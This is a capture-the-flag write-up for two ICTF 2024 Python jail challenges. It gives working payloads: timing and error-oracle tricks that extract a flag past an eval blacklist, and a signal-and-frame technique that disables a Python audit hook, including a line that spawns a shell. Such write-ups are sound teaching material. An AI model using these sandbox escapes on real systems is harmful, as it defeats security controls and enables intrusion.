# ICTF 2024 - *All PyJails* „ÄéANY %„Äè

## ***Ok nice*** | **Ord**inary challenge
### The challenge

```python
print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
while True:
    inp = input("Enter input: ")
    for i in blacklist:
        if i in inp:
            print("ok nice")
            exit(0)
    for i in inp:
        if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
            print("ok nice")
            exit(0)
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
    except:
        print("error")
```

Look at this nice challenge üòá We have a classic blacklist + emptied builtins.
Our goal seems to print ``jail``. Easy right ? Even without ``print`` üòá

Before solving, let's add some debugging to help us through our testing phase !
```python
print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']

while True:
    inp = input("Enter input: ")
    
    for i in blacklist:
        if i in inp:
            print("ok nice, bl")                                               ### NEW
            exit(0)
    
    for i in inp:
        if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
            print("ok nice, ct", (ord(i) > 125), (ord(i) < 40), len(set(inp))) ### NEW
            print(inp)                                                         ### NEW
            print("".join("#" if (ord(c) < 40) else "_" for c in inp))         ### NEW
            exit(0)
    
    try:
        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})                  ### NEW
        print("ok nice, eval-ed")
    except:
        print("error")
```

Now we can easily know *what blocked* and *where* if it's a banned character

### Solving process
1Ô∏è‚É£ First we don't have full execution (comes with an ``exec``) but we have an ``eval``. Meaning we *"""can't"""* write Python code but only *expressions* (No functions or statements). We don't care because we don't have builtins but it's something to note
2Ô∏è‚É£ Secondly we can't use the UTF8 tricks because the characters' value are limited
3Ô∏è‚É£ Thirdly we have a pretty small and easy to deal with blacklist but they block easy ideas. There is a character set limit too that will only block us later and will ask us for optimization
4Ô∏è‚É£ Fourthly we have a Try/Except that blocks any attempt to leak ``flag`` through an error log. *It doesn't mean we can't use errors as we have "error" printed when an error occurs* üëÄ
5Ô∏è‚É£ Fifth and last, we have access to ``ord`` to make numbers and do some shenanigans üòà

What we can aim for :
- get shell (why ???)
- showing the entire flag (needs builtins recovery + use of print in an eval = difficult)
- get flag's characters one by one (needs numbers -> possible)
	- throw at specific value (needs a way to throw in our context -> surely needs compare)
	- timing attack (needs a long execution time based on value -> surely needs loops)

<br>
#### Making numbers
To access a specific character from the flag we need numbers. We have
- 0 => ``False``
- 1 => ``True``
- n => ``True+True+...+True`` (we don't have a limit in length)
- -n => ``-True-True-...-True``
<br>
#### Try 1 : low hanging fruits
```python
{...}[flag[True]] # Dictionnary access, but no {} allowed
[flag,<TO DO: something that throws>][flag[True]=="a"] # Not a good enough compare, no =
for(a)in(range(ord(flag[True]))):ord(flag[True])  # Hmmmmmm, no for and range in 'eval' tho
[ord(flag[True])for(a)in(range(ord(flag[True])))] # Hmmmmmmmmmm
```
<br>
#### Try 2 : timing attack with homemade range and "for loop"
How can we make a ``range`` ? Easy ! With **slices** !
```python
<long string>[::ord(flag[<number>])]
```
But to make our homemade range and for loop we need numbers and a long string. Numbers are being taken care of but how can we make a long string ?
Well we have
- a string (flag)
- numbers
we have everything we need to make one long boy !
```python
(flag*<number>)[::ord(flag[<number>])]

# Example
(flag*67)[::ord(flag[1])]
(flag*ord(flag[True]))[::ord(flag[True])] # Assuming the flag starts with ICTF{...

# ... And because we have no limits in length
(flag*ord(flag[True])*ord(flag[True])*...*ord(flag[True]))[::ord(flag[True])
```
One big thing to note is that ``flag*67*67*...*67`` grows **VERY fast**. Like ``flag*67*67*67`` takes 1-3 seconds to process and adding an extra ``*67`` will make a ``MemoryError`` (not enough memory to handle the massive string üò®)

Let's make a quick payload generator
```python
def gen_payload(chr_pos,delta_time):
¬† ¬† if chr_pos==0: return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[False])]"
¬† ¬† if chr_pos==1: return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[True])]"
¬† ¬† return "(flag"+"*ord(flag[True])"*delta_time+")[::ord(flag[True"+"+True"*(chr_pos-1)+"])]"
```
Now we just need to execute a timing attack and we have the flag !
How do we decode the time ?

| string length | flag's character value | time  |
| ------------- | ---------------------- | ----- |
| $x\times67^3$ | 73 => I (given)        | $t_0$ |
| $x\times67^3$ | 67 => C (given)        | $t_1$ |
| $x\times67^3$ | 84 => T (given)        | $t_2$ |
| $x\times67^3$ | 70 => F (given)        | $t_3$ |
| $x\times67^3$ | ...                    | $t_n$ |


We can reverse the length of the flag and just do an simple cross product to find each flag's value, have fun üòà
<br>
#### Try 3 : Throw at specific value with a nice compare
We can't use ``=`` but we can still make compares !
```python
if(ord(flag[<number>])^<number>):raise # No raise :(
if(ord(flag[<number>])^<number>):a     # No if in eval
[a for i in flag if (ord(flag[<number>])^<number>)] # No spaces
[(a)for(i)in(flag)if(ord(flag[<number>])^<number>)] # Yeah !
```
Looks really good ! ...
... but we are using too many different characters üò•
```python
# Example
[(a)for(i)in(flag)if(ord(flag[True])^(True+True+...64 more...+True))] # flag[1]==67
```
Our idea is to have ``flag[n]^x==0``, because Python takes anything not null, empty or zero as True we can use another operation to have a 0. An operator like ``-`` !
```python
[(a)for(i)in(flag)if(ord(flag[<number>])-<number>)]

# Example
[(a)for(i)in(flag)if(ord(flag[-True])-(-True-True-...64 more...-True))] # flag[-1]==67
```
Works like a charm üéáü§©‚ú® We can read the flag backward and check every value for any of the flag's characters !

Here too let's make a payload generator
```python
def gen_payload2(rev_pos,chr):
¬† ¬† return "[(a)for(u)in(flag)if(-ord(flag["+"-True"*rev_pos+"])-("+"-True"*chr+"))]"
```

## ***Calc*** | Auditing Audithook
### The challenge
```python
from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()


if __name__ == "__main__":
    expr = input("Math expression: ")
    if len(expr) <= 200 and match(r"[0-9+\-*/]+", expr):
        print(safe_eval(_exit, expr))
    else:
        print("Do you know what is a calculator?")
```

Oooohh üòØ This one is an audithook bypass wrapped in a calculator themed jail.
For simplicity let's simplify it for now. We will comeback to the original version in the end

```python
from sys import addaudithook
from os import _exit

def safe_eval(exit, code):
    def hook(*a):
	    print(a) # for debugging
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()

expr = input("Math expression: ")
print(safe_eval(_exit, expr))
```

The calculator thingy can be bypassed easily by just using a number at the start of our payload. We will see later, don't worry
<br>
### Solving process
It's not a first time audit hooks appear in CTFs. Tho there is a critical difference here. Let's simplify the jail further to compare it to **MyJail** from *NBCTF2023* (archived challenge can be found [here](https://github.com/salvatore-abello/pyjail/blob/main/NBCTF%202023/MyJail.py)) :
```python
from sys import addaudithook

def hook(*a): exit(0)
def dummy() : pass

expr = input("Math expression: ")
dummy.__code__ = compile(expr, "<code>", "eval")

addaudithook(hook)

print(dummy())
```

If we try to bypass this jail it's pretty easy. We can't circumvent the audit rules but **we can modify the sentence** üòàüî®üë©‚Äç‚öñÔ∏è We just have to modify the ``hook`` function

```python
(exit:=lambda x:x), <full control>

# Examples
(exit:=lambda x:x),print("hacked >:)")
(exit:=lambda x:x),exec("import os;os.system('sh')")
```

Easy to do right ? But here is the challenge introduced by the challmaker. *We can't access the local variable ``exit`` and modify it !*

```python
def safe_eval(exit, code): # we are here at runtime and can do everything ...
    def hook(*a):
        exit(0)            # ... but here exit is added to hook at compile time
                           # so we can't modify it from the outside
    def dummy():
        pass
```

What can we do ?
- explore audithook's internals and "modify" ``hook`` ?
- explore Python's memory and "modify" ``hook`` ?
- access ``hook`` from "inside" instead of outside üëÄ
<br>
### Bypassing ``hook`` from the inside
Audithooks trigger at [certain events](https://docs.python.org/3/library/audit_events.html#audit-events). If we look at the ``import`` event it says
> `module`,¬†`filename`,¬†`sys.path`,¬†`sys.meta_path`,¬†`sys.path_hooks`

meaning it triggers when we open a file that is going to be used as a library... But what if **it is already loaded !** Like in our jail with ``from sys import addaudithook`` and ``from os import _exit`` !

```python
Math expression: __import__('sys')

# Output
<module 'sys' (built-in)>
```
```python
Math expression: __import__('sys').modules.keys()

# Output
dict_keys(['sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', 'winreg', '_io', 'marshal', 'nt', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', 'encodings.cp1252', '_signal', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', '_winapi', 'ntpath', 'os.path', 'os', '_sitebuiltins', '_distutils_hack', 'site'])
```

Wow ü§© That's a lot of modules to work with ! Most are out of audithooks' events too üòà
If we ignore the Windows modules (no I won't apology for that) we can search in each frozen modules for gold.
I will spoil it, ``_signal`` is where gold is hidden. There is some good stuff in ``_frozen_importlib`` and ``_imp`` too but when they go to read a file they execute ``os.listdir``, raising an event üò≠ You can also tinker with *debug traces*, ``_thread`` and other *builtin modules* (loadable with ``_frozen_importlib``) but in my testing I didn't achieve anything substantial (*skill issue* üôÑ)
<br>
### Signaling we escaped üòé
Audithooks block ``sys._current_frames``, ``sys._getframe`` and ``sys._getframemodulename`` to protect the code from being tampered with. We can't call this functions but what if the ``frame`` object came to us directly üòá ?
For that we are going to use [signals](https://docs.python.org/3/library/signal.html).  We can create a signal using ``signal.signal(signalnum,¬†handler)`` ([ref](https://docs.python.org/3/library/signal.html#signal.signal))
> *signalnum* : the signal number üÜó
> 
> The¬†_handler_¬†is called with two arguments: the **signal number** and the **current stack frame** ü§ë

```python
signal.signal(2, lambda n,f:print(f))
```

To launch our trojan signal we just need to raise it using ``raise_signal(signalnum)``

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f)),s.raise_signal(2)

# Output
<frame at 0x000001F3EA9A8E00, file '<code>', line 1, code <module>>
(<module '_signal' (built-in)>, <built-in function default_int_handler>, None)

# dir(f)
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', 
'__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'f_back', 'f_builtins', 'f_code', 'f_globals', 'f_lasti', 'f_lineno', 'f_locals', 'f_trace', 'f_trace_lines', 'f_trace_opcodes']

# f_locals
{'__name__': '__main__', '__doc__': 'from sys import addaudithook\n\ndef hook(*a): exit(0)\ndef dummy() : pass\n\nexpr = input("Math expression: ")\ndummy.__code__ = compile(expr, "<code>", "eval")\n\naddaudithook(hook)\n\nprint(dummy())', '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x00000162B1E85210>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'c:path\\to\\wu.py', '__cached__': None, 'addaudithook': <built-in function addaudithook>, '_exit': <built-in function _exit>, 'safe_eval': <function safe_eval at 0x00000162B1E304A0>, 'expr': "s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_locals)),s.raise_signal(2)", 's': <module '_signal' (built-in)>}
```

Well not the right frame, let's move up and down with ``f_back`` (leaving the ``dummy()`` frame and going to ``safe_eval``)

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back)),s.raise_signal(2)

# Output
<frame at 0x000001A3949DAF60, file 'c:path\\to\\wu.py', line 27, code safe_eval>

# f_locals
{'exit': <built-in function _exit>, 'code': "(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back.f_locals)),s.raise_signal(2)", 'hook': <function safe_eval.<locals>.hook at 0x000001ABF4218D60>, 'dummy': <function safe_eval.<locals>.dummy at 0x000001ABF4218EA0>}
```

Finally ü§© ! We have access to ``hook`` ü•≥üéâ
To finish we just need to modify its local values through its ``__closure__`` ([ref](https://docs.python.org/3/reference/datamodel.html#function.__closure__))

```python
lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr))
```

ü•Å ***Final solution*** ü•Å

```python
(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()

# And to avoid the limits in the Original version‚Ñ¢Ô∏è
0,(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()


# Output
(0, <module '_signal' (built-in)>, <built-in function default_int_handler>, None, 'well_done')
```
<br><br>
## Closing note
Overall pretty interesting PyJails üíñ They were well guided with their really distinct little details, the left over ``ord`` in Ok Nice and all the function setup in Calc.
As always we learned a lot about Python internals and what a madness it is in there üòã Ok Nice was based more on our Python skills and creativity to get the flag, while Calc was more on Python internals (sys, \_signal, frames, closure, ...)
For **Calc**, one inspiration to find a bypass would be by looking at what was previously made. Audithooks are pwned since Python 3.8 and there are some places where it is ~~randomly~~ discussed, for instance [on Github](https://github.com/python/cpython/issues/87604)
